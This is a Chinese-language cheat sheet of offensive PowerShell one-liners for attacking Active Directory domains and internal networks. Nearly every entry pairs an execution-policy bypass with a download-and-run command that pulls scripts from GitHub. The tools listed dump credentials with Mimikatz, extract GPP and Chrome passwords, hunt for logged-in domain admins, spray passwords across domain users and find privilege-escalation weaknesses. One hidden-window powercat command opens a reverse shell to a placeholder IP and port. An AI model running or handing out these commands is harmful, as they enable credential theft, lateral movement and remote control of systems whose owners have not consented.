一些在进行内网、域渗透的时候比较有用、有趣的PowerShell脚本

- #### [Discover-PSMSSQLServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers)   
    此脚本将通过ADSI去发现活动目录林中的MSSQL服务
    - `powershell -exec bypass -Command "&{Import-Module .\Discover-PSMSSQLServers.ps1; Discover-PSMSSQLServers}" > C:\Windows\Temp\Discover-PSMSSQLServers.txt`
    - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Discover-PSMSSQLServers'); Discover-PSMSSQLServers" > C:\Windows\Temp\Discover-PSMSSQLServers.txt`

- #### [Discover-PSInterestingServices](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSInterestingServices)
    此脚本将通过LDAP去发现活动目录林中那些令人感兴趣的服务
    - `powershell -exec bypass -Command "&{Import-Module .\Discover-PSInterestingServices.ps1; Discover-PSInterestingServices}" > C:\Windows\Temp\Discover-PSInterestingServices.txt`
    - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Discover-PSInterestingServices'); Discover-PSInterestingServices" > C:\Windows\Temp\Discover-PSInterestingServices.txt`
   
- #### [Discover-PSMSExchangeServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers)
    此脚本将通过LDAP去发现活动目录林中的Exchange服务器
    - `powershell -exec bypass -Command "&{Import-Module .\Discover-PSMSExchangeServers.ps1; Discover-PSMSExchangeServers}" > C:\Windows\Temp\Discover-PSMSExchangeServers.txt`
    - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Discover-PSMSExchangeServers'); Discover-PSMSExchangeServers" > C:\Windows\Temp\Discover-PSMSExchangeServers.txt`
    
- #### [Find-PSServiceAccounts](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts)
    此脚本将发现AD域或林中的ServicePrincipalName服务账户
    - `powershell -exec bypass -Command "&{Import-Module .\Find-PSServiceAccounts.ps1; Find-PSServiceAccounts}" > C:\Windows\Temp\Find-PSServiceAccounts.txt`
    - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts'); Find-PSServiceAccounts" > C:\Windows\Temp\Find-PSServiceAccounts.txt`
    
- #### [Get-DomainKerberosPolicy](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Get-DomainKerberosPolicy)
    此脚本获取域Kerberos策略，需要安装组策略模块
    - `powershell -exec bypass -Command "&{Import-Module .\Get-DomainKerberosPolicy.ps1; Get-DomainKerberosPolicy}" > C:\Windows\Temp\Get-DomainKerberosPolicy.txt`
    - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Get-DomainKerberosPolicy'); Get-KerberosPolicy" > C:\Windows\Temp\Get-DomainKerberosPolicy.txt`
    
- #### [Get-PSADForestInfo](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Get-PSADForestInfo)
    此脚本将收集域环境信息
    - `powershell -exec bypass -Command "&{Import-Module .\Get-PSADForestInfo.ps1; Get-PSADForestInfo}" > C:\Windows\Temp\Get-PSADForestInfo.txt`
    - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Get-PSADForestInfo'); Get-PSADForestInfo" > C:\Windows\Temp\Get-PSADForestInfo.txt`
    
- #### [Get-PSADForestKRBTGTInfo](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Get-PSADForestKRBTGTInfo)
    此脚本将收集所有的KRBTGT账户信息
    - `powershell -exec bypass -Command "&{Import-Module .\Get-PSADForestKRBTGTInfo.ps1; Get-PSADForestKRBTGTInfo}" > C:\Windows\Temp\Get-PSADForestKRBTGTInfo.txt`
    - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Get-PSADForestKRBTGTInfo'); Get-PSADForestKRBTGTInfo" > C:\Windows\Temp\Get-PSADForestKRBTGTInfo.txt`
    
- #### [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
    此脚本即GPP组策略漏洞PowerShell利用脚本，它将在域控上搜索groups.xml、scheduledtasks.xml、services.xml和datasources.xml文件，并返回其中的明文密码
    - `powershell -exec bypass -Command "&{Import-Module .\Get-GPPPassword.ps1; Get-GPPPassword}" > C:\Windows\Temp\Get-GPPPassword.txt`
    - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1'); Get-GPPPassword" > C:\Windows\Temp\Get-GPPPassword.txt`
   
- #### [Get-GPPAutologon](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1)
    此脚本将在域控中搜索registry.xml以查找自动登录信息，并返回用户名和密码
    - `powershell -exec bypass -Command "&{Import-Module .\Get-GPPAutologon.ps1; Get-GPPAutologon}" > C:\Windows\Temp\Get-GPPAutologon.txt`
    - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPAutologon.ps1'); Get-GPPAutologon" > C:\Windows\Temp\Get-GPPAutologon.txt`
    
- #### [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
    mimikatz抓密码明文的PowerShell版
    - `powershell -exec bypass -Command "&{Import-Module .\Invoke-Mimikatz.ps1; Invoke-Mimikatz -DumpCreds}" > C:\Windows\Temp\Invoke-Mimikatz.txt`
    - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds" > C:\Windows\Temp\Invoke-Mimikatz.txt`
    
- #### [Powerview](https://github.com/ericshoemaker/PowerView/blob/master/Powerview.ps1)
    域信息收集脚本
    - Invoke-UserHunter——查找onedomain域中domain admins曾登录过的机器（域内管理员定位）
        - `powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-UserHunter -Domain 'onedomain'}" > C:\Windows\Temp\onedomainadmins.txt`
        - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerView/master/Powerview.ps1'); Invoke-UserHunter -Domain \"onedomain\"" > C:\Windows\Temp\onedomainadmins.txt`
    - Invoke-UserHunter——查找指定someone登录过的机器（域内人员定位）
        - `powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-UserHunter -UserName \"someone\"}" > C:\Windows\Temp\Someone.txt`
        - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerView/master/Powerview.ps1'); Invoke-UserHunter -UserName \"someone\"" > C:\Windows\Temp\Someone.txt`
    - Invoke-UserHunterThreaded——查找指定someone登录过的机器 Invoke-UserHunter的多线程版（域内人员定位）
        - `powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-UserHunterThreaded -UserName \"someone\"}" > C:\Windows\Temp\someone.txt`
        - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerView/master/Powerview.ps1'); Invoke-UserHunterThreaded -UserName \"someone\"" > C:\Windows\Temp\someone.txt`
    - Invoke-StealthUserHunter——查找onedomain域中domain admins共享源机器(session from)，其通过检查默认的公共文件服务器上的网络session和SPN记录
        - `powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-StealthUserHunter -Domain 'onedomain'}" > C:\Windows\Temp\onedomainadmins.txt`
        - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerView/master/Powerview.ps1'); Invoke-StealthUserHunter -Domain \"onedomain\"" > C:\Windows\Temp\onedomainadmins.txt`
    - Invoke-StealthUserHunter——查找指定someone共享源机器(session from)，其通过检查默认的公共文件服务器上的网络session和SPN记录
        - `powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-StealthUserHunter -UserName \"someone\"}" > C:\Windows\Temp\someone.txt`
        - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerView/master/Powerview.ps1'); Invoke-StealthUserHunter -UserName \"someone\"" > C:\Windows\Temp\Someone.txt`
    - Invoke-Netview——获取域内主机的域信息，每个主机上登录的用户并检索此主机建立的共享会话
        - `powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-Netview}" > C:\Windows\Temp\netview.txt`
        - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerView/master/Powerview.ps1'); Invoke-Netview" > C:\Windows\Temp\netview.txt`
    - Invoke-NetviewThreaded——获取域内主机的域信息，每个主机上登录的用户并检索此主机建立的共享会话  Invoke-Netview的多线程版
        - `powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-NetviewThreaded}" > C:\Windows\Temp\netview.txt`
        - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerView/master/Powerview.ps1'); Invoke-NetviewThreaded" > C:\Windows\Temp\netviewt.txt`
    - Invoke-ShareFinder——查找建立的共享会话
        - `powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-ShareFinder}" > C:\Windows\Temp\sharefinder.txt`
        - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerView/master/Powerview.ps1'); Invoke-ShareFinder" > C:\Windows\Temp\sharefinder.txt`
    - Invoke-ShareFinderThreaded——Invoke-ShareFinderThreaded的多线程版本
        - `powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-ShareFinderThreaded}" > C:\Windows\Temp\sharefinder.txt`
        - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerView/master/Powerview.ps1'); Invoke-ShareFinderThreaded" > C:\Windows\Temp\sharefinder.txt`

- #### [Get-ChromeDump](https://github.com/xorrior/RandomPS-Scripts/blob/master/Get-ChromeDump.ps1)
    Chrome浏览器历史访问记录和密码Dump脚本
    - `powershell -exec bypass -Command "&{Import-Module .\Get-ChromeDump.ps1; Get-ChromeDump -OutFile 'C:\Windows\Temp\ChromeDump.txt'}"`
    - `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/Get-ChromeDump.ps1'); Get-ChromeDump -OutFile 'C:\Windows\Temp\ChromeDump.txt'"`
    
- #### [HostEnum](https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1)
    - 枚举本机信息，包括：操作系统详细信息，主机名，正常运行时间，安装日期，已安装的应用程序和补丁，网络适配器配置，网络共享，侦听端口，连接，路由表，DNS缓存，防火墙状态，运行进程和已安装的服务，有趣的注册表项，本地用户/组/管理员 ，个人安全产品状态，杀软进程，通过文件索引编制有趣的文件位置和关键字搜索，有趣的Windows日志（用户登录），浏览器历史记录等，并生成HTML页面以便浏览分析
        - `powershell -exec bypass -Command "&{Import-Module .\HostEnum.ps1; Invoke-HostEnum -Local -HTMLReport -Verbose}"`
        - `powershell -exec bypass -Command "IEX (new-object net.webclient).DownloadString('https://raw.githubusercontent.com/threatexpress/red-team-scripts/master/HostEnum.ps1'); Invoke-HostEnum -Local -HTMLReport -Verbose"`
    - 枚举域内信息
        - `powershell -exec bypass -Command "&{Import-Module .\HostEnum.ps1; Invoke-HostEnum -Domain -HTMLReport -Verbose}"`
        - `powershell -exec bypass -Command "IEX (new-object net.webclient).DownloadString('https://raw.githubusercontent.com/threatexpress/red-team-scripts/master/HostEnum.ps1');Invoke-HostEnum -Domain -HTMLReport -Verbose"`
        
- #### [powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)
    PowerShell版本的nc
    反弹shell
        - `powershell -exec bypass -Command "&{Import-Module .\powercat.ps1; powercat -c IP -p PORT -e cmd}"`
        - `powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c IP -p PORT -e cmd"`
        
- #### [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)
    域用户暴力破解脚本
        - 使用当前域所有用户和指定密码password进行暴力破解
            - `powershell -exec bypass -Command "&{Import-Module .\DomainPasswordSpray.ps1; Invoke-DomainPasswordSpray -Password password}"`
            - `powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Password password"`
        - 使用指定的用户字典文件users.txt和密码字典文件passlist.txt对指定域domain-name进行暴力破解，并输出至指定文件sprayed-creds.txt
            - `powershell -exec bypass -Command "&{Import-Module .\DomainPasswordSpray.ps1; Invoke-DomainPasswordSpray  -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt}"`
            - `powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray  -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"`

- #### [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
- 发现一些可能被用于权限提升的脆弱点
- `powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks -HTMLReport`